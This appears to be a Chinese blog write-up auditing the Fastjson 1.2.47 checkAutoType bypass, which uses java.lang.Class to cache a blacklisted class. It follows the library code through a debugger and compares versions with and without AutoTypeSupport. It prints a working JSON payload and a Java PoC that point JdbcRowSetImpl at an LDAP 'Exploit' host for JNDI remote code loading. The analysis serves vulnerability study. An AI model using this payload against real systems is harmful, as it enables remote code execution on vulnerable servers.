+<p>这个函数里面是会往deserializers这个mapping中放入一些特定类：<code>java.awt.*</code>、<code>java.time.*</code>、<code>java.util.Optional*</code>、<code>java.nio.file.Path</code>、<code>Map.Entry.class</code>、以及在服务器<code>META-INF/services/</code>目录下存放的class文件，还有枚举类的一些判断。对于一些数组，集合，map等再调用<code>putDesserializer</code>（这也是另一个会影响到desesrializers这个map的类）放入deserializers这个mapping中。</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706163202276.png" alt="image-20200706163202276"></p>
+<p>在这个类中对于类名有着严格的要求和限定，不太行。看下一个。</p>
+<ol start="2">
+<li><strong>putDeserializer</strong></li>
+</ol>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">com.alibaba.fastjson.parser.ParserConfig#putDeserializer</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">putDeserializer</span><span class="params">(Type type, ObjectDeserializer deserializer)</span> </span>&#123;</span><br><span class="line">        deserializers.put(type, deserializer);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码极其简单，但是只在ParserConfig#<code>getDeserializer</code>和<code>initJavaBeanDeserializers</code>类中使用过。但是后者是一个初始化函数，我们同样不可控输入值。</p>
+<p>那么我们好像发现我们的输入不可以改变deserializers这个mapping的值，从而自然也不能进一步在checkAutoType中被get读取出来，也就绕过不了。</p>
+<p>这个<strong>deserializers在checkAutoType方法中存在的意义</strong>应该是直接放行一些常用的类，来提升解析速度。</p>
+<p>那换一条路看看<code>TypeUtils.getClassFromMapping(typeName)</code>。</p>
+<h2 id="TypeUtils-getClassFromMapping-typeName"><a href="#TypeUtils-getClassFromMapping-typeName" class="headerlink" title="TypeUtils.getClassFromMapping(typeName)"></a>TypeUtils.getClassFromMapping(typeName)</h2><p>先看<code>getClassFromMapping</code>：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这个map是一个hashmap</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ConcurrentMap&lt;String,Class&lt;?&gt;&gt; mappings = <span class="keyword">new</span> ConcurrentHashMap&lt;String,Class&lt;?&gt;&gt;(<span class="number">16</span>, <span class="number">0.75f</span>, <span class="number">1</span>);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className)&#123;</span><br><span class="line">        <span class="comment">//很简单的一个mapping的get</span></span><br><span class="line">        <span class="keyword">return</span> mappings.get(className);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>按照套路去寻找影响这个mappings的put方法。搜索<code>mappings.put</code>，在下面这两个方法中有找到：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings</span><br><span class="line">com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader, boolean)</span><br></pre></td></tr></table></figure>
+
+<p>看<code>addBaseClassMappings</code>这个方法，它是一个没有传参的方法….这样我们就没有一个可控的参数去控制其中的内容。</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706163801667.png" alt="image-20200706163801667"></p>
+<p>前者是一个static静态代码块：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span>&#123;</span><br><span class="line">        addBaseClassMappings();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>后者是一个<code>clearClassMapping</code>方法：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">clearClassMapping</span><span class="params">()</span></span>&#123;</span><br><span class="line">    mappings.clear();</span><br><span class="line">    addBaseClassMappings();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>没戏，不可控。</p>
+<p>再看另一个有mappings.put的位置<code>TypeUtils.loadClass</code>，我们需要详细看看这个方法：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="keyword">boolean</span> cache) &#123;</span><br><span class="line">        <span class="comment">//判断className是否为空，是的话直接返回null</span></span><br><span class="line">        <span class="keyword">if</span>(className == <span class="keyword">null</span> || className.length() == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断className是否已经存在于mappings中</span></span><br><span class="line">        Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line">        <span class="keyword">if</span>(clazz != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="comment">//是的话，直接返回</span></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断className是否是[开头，1.2.44中针对限制的东西就是这个</span></span><br><span class="line">        <span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">'['</span>)&#123;</span><br><span class="line">            Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">            <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断className是否L开头;结尾，1.2.42/43中针对限制的就是这里，但都是在外面限制的，里面的东西没变</span></span><br><span class="line">        <span class="keyword">if</span>(className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>))&#123;</span><br><span class="line">            String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//1. 我们需要关注的mappings在这里有</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//输入的classLoader不为空时</span></span><br><span class="line">            <span class="keyword">if</span>(classLoader != <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="comment">//调用加载器去加载我们给的className</span></span><br><span class="line">                clazz = classLoader.loadClass(className);</span><br><span class="line">                <span class="comment">//！！如果cache为true！！</span></span><br><span class="line">                <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                    <span class="comment">//往我们关注的mappings中写入这个className</span></span><br><span class="line">                    mappings.put(className, clazz);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> clazz;<span class="comment">//返回加载出来的类</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="comment">// skip</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//2. 在这里也有，但是好像这里有关线程，比较严格。</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="keyword">if</span>(contextClassLoader != <span class="keyword">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class="line">                clazz = contextClassLoader.loadClass(className);</span><br><span class="line">                <span class="comment">//同样需要输入的cache为true，才有可能修改</span></span><br><span class="line">                <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                    mappings.put(className, clazz);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">            <span class="comment">// skip</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//3. 这里也有，限制很松</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//加载类</span></span><br><span class="line">            clazz = Class.forName(className);</span><br><span class="line">            <span class="comment">//直接放入mappings中</span></span><br><span class="line">            mappings.put(className, clazz);</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">            <span class="comment">// skip</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现如果可以控制输入参数，是可以往这个mappings中写入任意类名的（从而绕过autocheck的黑白名单）。</p>
+<p>看看这个函数在什么地方被引用。</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706184302813.png" alt="image-20200706184302813"></p>
+<p>在这里面只需要找到符合条件的即可，也就是第三个参数cache=true，发现在1206行，跳转过去看：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706184824853.png" alt="image-20200706184824853"></p>
+<p>但跟进去发现这里是在调用自己内部本身，继续依次看，发现一个敏感接口：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">/com/alibaba/fastjson/serializer/MiscCodec.java#deserialze(DefaultJSONParser parser, Type clazz, Object fieldName):334</span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706190449802.png" alt="image-20200706190449802"></p>
+<p>跟进去执行分析：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> </span>&#123;</span><br><span class="line">        JSONLexer lexer = parser.lexer;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4. clazz类型等于InetSocketAddress.class的处理。</span></span><br><span class="line">        <span class="comment">//我们需要的clazz必须为Class.class，不进入</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == InetSocketAddress<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object objVal;</span><br><span class="line">        <span class="comment">//3. 下面这段赋值objVal这个值</span></span><br><span class="line">        <span class="comment">//此处这个大的if对于parser.resolveStatus这个值进行了判断，我们在稍后进行分析这个是啥意思</span></span><br><span class="line">        <span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;</span><br><span class="line">            <span class="comment">//当parser.resolveStatus的值为  TypeNameRedirect</span></span><br><span class="line">            parser.resolveStatus = DefaultJSONParser.NONE;</span><br><span class="line">            parser.accept(JSONToken.COMMA);</span><br><span class="line">            <span class="comment">//lexer为json串的下一处解析点的相关数据</span></span><br><span class="line">             <span class="comment">//如果下一处的类型为string</span></span><br><span class="line">            <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">                <span class="comment">//判断解析的下一处的值是否为val，如果不是val，报错退出</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="string">"val"</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//移动lexer到下一个解析点</span></span><br><span class="line">                <span class="comment">//举例："val":(移动到此处-&gt;)"xxx"</span></span><br><span class="line">                lexer.nextToken();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            parser.accept(JSONToken.COLON);</span><br><span class="line">            <span class="comment">//此处获取下一个解析点的值"xxx"赋值到objVal</span></span><br><span class="line">            objVal = parser.parse();</span><br><span class="line"></span><br><span class="line">            parser.accept(JSONToken.RBRACE);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//当parser.resolveStatus的值不为TypeNameRedirect</span></span><br><span class="line">            <span class="comment">//直接解析下一个解析点到objVal</span></span><br><span class="line">            objVal = parser.parse();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String strVal;</span><br><span class="line">        <span class="comment">//2. 可以看到strVal是由objVal赋值，继续往上看</span></span><br><span class="line">        <span class="keyword">if</span> (objVal == <span class="keyword">null</span>) &#123;</span><br><span class="line">            strVal = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            strVal = (String) objVal;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//不必进入的分支</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strVal == <span class="keyword">null</span> || strVal.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//省略诸多对于clazz类型判定的不同分支。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1. 可以得知，我们的clazz必须为Class.class类型</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == Class<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//我们由这里进来的loadCLass</span></span><br><span class="line">            <span class="comment">//strVal是我们想要可控的一个关键的值，我们需要它是一个恶意类名。往上看看能不能得到一个恶意类名。</span></span><br><span class="line">            <span class="keyword">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么经过分析，我们可以得到的关注点又跑到<code>parser.resolveStatus</code>这上面来了</p>
+<ol>
+<li><p>当<code>parser.resolveStatus == TypeNameRedirect</code> 我们需要json串中有一个<strong>“val”:”恶意类名”</strong>，来进入if语句的true中，污染objVal，再进一步污染strVal。我们又需要<strong>clazz为class类</strong>来满足if判断条件进入loadClass。</p>
+<p>所以一个json串的格式大概为<code>&quot;@type&quot;=&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;恶意类名&quot;</code> 这样一个东西，大概如此。</p>
+</li>
+<li><p>当<code>parser.resolveStatus ！= TypeNameRedirect</code>进入if判断的false中，可以直接污染objVal。</p>
+<p>再加上<strong>clazz=class类</strong>，大概需要一个json串如下:<code>&quot;被屏蔽的type&quot;=&quot;java.lang.Class&quot;,&quot;恶意类名&quot;</code>。</p>
+</li>
+</ol>
+<p>至于哪里调用了<code>MiscCodec.java#deserialze</code>，查看引用处其实可以发现这是一个非常多地方会调用到的常用函数，就比如解析过程中的<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)-384行</code></p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706193256474.png" alt="image-20200706193256474"></p>
+<h2 id="定向构造payload"><a href="#定向构造payload" class="headerlink" title="定向构造payload"></a>定向构造payload</h2><p>那么在得到如上信息中，我们就不必一直大海摸虾。之前拿到了两个分支paylaod，拿一个可能的paylaod，试试水看看能不能往TypeUtils.getClassFromMapping(typeName）里面的mapping污染我们的恶意类。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"@type"</span>: <span class="string">"java.lang.Class"</span>, </span><br><span class="line">    <span class="string">"val"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先是日常进入解析主要函数<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code></p>
+<p>这里有我们的三个在乎的点，如下顺序：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">parseObject</span><span class="params">(<span class="keyword">final</span> Map object, Object fieldName)</span> </span>&#123;</span><br><span class="line">   ...  </span><br><span class="line">   <span class="comment">//先是checkAutoType这个万恶的过滤函数</span></span><br><span class="line">   clazz = config.checkAutoType(typeName, <span class="keyword">null</span>, lexer.getFeatures());</span><br><span class="line">   ...</span><br><span class="line">   <span class="comment">//ResolveStatus的赋值</span></span><br><span class="line">   <span class="keyword">this</span>.setResolveStatus(TypeNameRedirect);</span><br><span class="line">   <span class="comment">//污染TypeUtils.getClassFromMapping的触发处</span></span><br><span class="line">   Object obj = deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class, int)</code>这个分析过了。</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706195524423.png" alt="image-20200706195524423"></p>
+<p>step out之后继续跟进，可以看到，给ResolveStatus赋值了TypeNameRedirect，这样到deserialze里面就可以确定了分支，与预计吻合。</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706200040175.png" alt="image-20200706200040175"></p>
+<p>继续跟，就到了第三个关注点deserialize函数：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706200201139.png" alt="image-20200706200201139"></p>
+<p>果断跟进去！</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706201609999.png" alt="image-20200706201609999"></p>
+<p>继续跟，恶意类被解析赋值！</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706201735423.png" alt="image-20200706201735423"></p>
+<p>跳过后续的一堆if判断，来到符合条件的clazz对象，跟进去：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706201836682.png" alt="image-20200706201836682"></p>
+<p>默认的cache为true，接下来就会进入三个mapping.put条件，跟下去，看看哪个能触发：</p>
+<p>第一个，发现classloader是null，被skip掉了。</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706202152124.png" alt="image-20200706202152124"></p>
+<p>来到第二个，跟进去，发现被加入到map中了，sum+1：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706202451082.png" alt="image-20200706202451082"></p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/20200102094438-6facdc2e-2d01-1.jpg" alt="img"></p>
+<p>第二个if中，帮我们加载了一个classloader，再因为上一层的cache默认为true，就真的执行成功了<code>mappings.put</code>放入了我们的恶意类名！</p>
+<p>完美穿针引线，一环扣一环，往mappings中加入了我们的恶意类。</p>
+<p>老习惯，附上调用栈：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/20200102094438-6fc52b08-2d01-1.jpg" alt="img"></p>
+<h2 id="定稿payload"><a href="#定稿payload" class="headerlink" title="定稿payload"></a>定稿payload</h2><p>之前看到其他博客说，一开始payload是分成两截，因为服务器的mappings自从加过恶意类之后，就会一直保持，然后就可以随便打了。</p>
+<p>但是之后为了不让负载均衡，平摊payload造成有几率失败，就变成了下面这个：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"a"</span>:&#123;</span><br><span class="line">        <span class="string">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="string">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"b"</span>:&#123;</span><br><span class="line">        <span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>,</span><br><span class="line">        <span class="string">"autoCommit"</span>:<span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcRowSetImplPoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        String payload  = <span class="string">"&#123;\"a\":&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,"</span></span><br><span class="line">                + <span class="string">"\"b\":&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","</span></span><br><span class="line">                + <span class="string">"\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\"autoCommit\":true&#125;&#125;"</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706202953984.png" alt="image-20200706202953984"></p>
+<p>本次Fastjson反序列化漏洞也是基于checkAutoType()函数绕过的，并且无需开启AutoTypeSupport，大大提高了成功利用的概率。</p>
+<p>绕过的大体思路是通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，checkAutoType()就会抛出异常终止程序。</p>
+<p>回顾一下审计的过程：</p>
+<p>我们进入com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</p>
+<ol>
+<li>checkAutoType方法拿到Class.class</li>
+<li>设置了ResolveStatus为TypeNameRedirect，决定了之后deserialze中的if走向</li>
+<li>进入deserializer.deserialze</li>
+</ol>
+<p>com.alibaba.fastjson.serializer.MiscCodec#deserialze</p>
+<ol>
+<li>parser.resolveStatus为TypeNameRedirect，进入if为true走向</li>
+<li>解析”val”:”恶意类名”，放入objVal，再传递到strVal</li>
+<li>因为clazz=Class.class，进入TypeUtils.loadClass，传入strVal</li>
+</ol>
+<p>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader)</p>
+<ol>
+<li>添加默认cache为true，调用loadClass</li>
+</ol>
+<p>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader, boolean)</p>
+<ol>
+<li>三个改变mappings的第一处，由于classLoader=null，不进入</li>
+<li>三个改变mappings的第二处，classLoader=null，进入；获取线程classLoader，由于cache为true，添加mappings。</li>
+</ol>
+<h1 id="关于AutoTypeSupport"><a href="#关于AutoTypeSupport" class="headerlink" title="关于AutoTypeSupport"></a>关于AutoTypeSupport</h1><p>可以看到实际上还是利用了com.sun.rowset.JdbcRowSetImpl这条利用链来攻击利用的，因此除了JDK版本外几乎没有限制。</p>
+<p>但是如果目标服务端开启了AutoTypeSupport呢？经测试发现：</p>
+<ul>
+<li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</li>
+<li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</li>
+</ul>
+<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><h3 id="受AutoTypeSupport影响的版本"><a href="#受AutoTypeSupport影响的版本" class="headerlink" title="受AutoTypeSupport影响的版本"></a>受AutoTypeSupport影响的版本</h3><p>受AutoTypeSupport影响的版本为1.2.25-1.2.32，本次调试的是1.2.25版本。</p>
+<h4 id="开启AutoTypeSupport时"><a href="#开启AutoTypeSupport时" class="headerlink" title="开启AutoTypeSupport时"></a>开启AutoTypeSupport时</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>
+
+<p>发现报错：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706204309011.png" alt="image-20200706204309011"></p>
+<p>调试发现，在第一部分JSON数据的解析中，checkAutoType()函数的处理过程和前面是差不多的。能够成功通过该函数的检测，因此问题不在这，继续往下调试。</p>
+<p>在第二部分JSON数据的解析中，@type指向的”com.sun.rowset.JdbcRowSetImpl”在checkAutoType()函数中会被dentList黑名单中的”com.sun.”匹配到，因此会直接报错显示不支持：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706205306004.png" alt="image-20200706205306004"></p>
+<h4 id="未开启AutoTypeSupport时"><a href="#未开启AutoTypeSupport时" class="headerlink" title="未开启AutoTypeSupport时"></a>未开启AutoTypeSupport时</h4><p>当不开启AutoTypeSupport时就不会进入该黑白名单校验的代码逻辑中，就不会被过滤报错。</p>
+<p>这里，我们换个不受AutoTypeSupport影响的且未使用哈希黑名单的版本来方便我们进行对比查看，这里选了1.2.33，看下checkAutoType()中对应的代码：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706211622134.png" alt="image-20200706211622134"></p>
+<p>对比黑名单校验的if判断语句条件就知道了，为什么后面的版本不受影响，那是因为通过<code>&amp;&amp;</code>多添加了一个判断条件<code>TypeUtils.getClassFromMapping(typeName) == null</code>，但是第二部分JSON内容中的类已经通过第一部分解析的时候加载到Map中缓存了，因此该条件不成立从而成功绕过：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 受AutoTypeSupport影响的版本</span></span><br><span class="line"><span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不受AutoTypeSupport影响的版本</span></span><br><span class="line"><span class="keyword">if</span> (className.startsWith(deny) &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br></pre></td></tr></table></figure>
+
+<h3 id="不受AutoTypeSupport影响的版本"><a href="#不受AutoTypeSupport影响的版本" class="headerlink" title="不受AutoTypeSupport影响的版本"></a>不受AutoTypeSupport影响的版本</h3><p>不受AutoTypeSupport影响的版本为1.2.33-1.2.47，本次调试的是1.2.47版本。</p>
+<h4 id="未开启AutoTypeSupport时-1"><a href="#未开启AutoTypeSupport时-1" class="headerlink" title="未开启AutoTypeSupport时"></a>未开启AutoTypeSupport时</h4><p>在调用DefaultJSONParser.parserObject()函数时，其会对JSON数据进行循环遍历扫描解析。</p>
+<p>在第一次扫描解析中，进行checkAutoType()函数，由于未开启AutoTypeSupport，因此不会进入黑白名单校验的逻辑；由于@type执行java.lang.Class类，该类在接下来的findClass()函数中直接被找到，并在后面的if判断clazz不为空后直接返回：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706212531680.png" alt="image-20200706212531680"></p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706212622129.png" alt="image-20200706212622129"></p>
+<p>往下调试，调用到MiscCodec.deserialze()，其中判断键是否为”val”，是的话再提取val键对应的值赋给objVal变量，而objVal在后面会赋值给strVal变量：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706212816333.png" alt="image-20200706212816333"></p>
+<p>接着判断clazz是否为Class类，是的话调用TypeUtils.loadClass()加载strVal变量值指向的类：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706212914209.png" alt="image-20200706212914209"></p>
+<p>在TypeUtils.loadClass()函数中，成功加载com.sun.rowset.JdbcRowSetImpl类后，就会将其缓存在Map中：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/5.png" alt="img"></p>
+<p>在扫描第二部分的JSON数据时，由于前面第一部分JSON数据中的val键值”com.sun.rowset.JdbcRowSetImpl”已经缓存到Map中了，所以当此时调用TypeUtils.getClassFromMapping()时能够成功从Map中获取到缓存的类，进而在下面的判断clazz是否为空的if语句中直接return返回了，从而成功绕过checkAutoType()检测：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/6-20200706213237782.png" alt="img"></p>
+<h4 id="开启AutoTypeSupport"><a href="#开启AutoTypeSupport" class="headerlink" title="开启AutoTypeSupport"></a>开启AutoTypeSupport</h4><p>由前面知道，开启AutoTypeSupport后，在checkAutoType()函数中会进入黑白名单校验的代码逻辑。</p>
+<p>在第一部分JSON数据的扫描解析中，由于@type指向java.lang.Class，因此即使是开启AutoTypeSupport先后进行白名单、黑名单校验的情况下都能成功通过检测，之后和前面的一样调用findClass()函数获取到Class类：</p>
+<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/7.png" alt="img"></p>
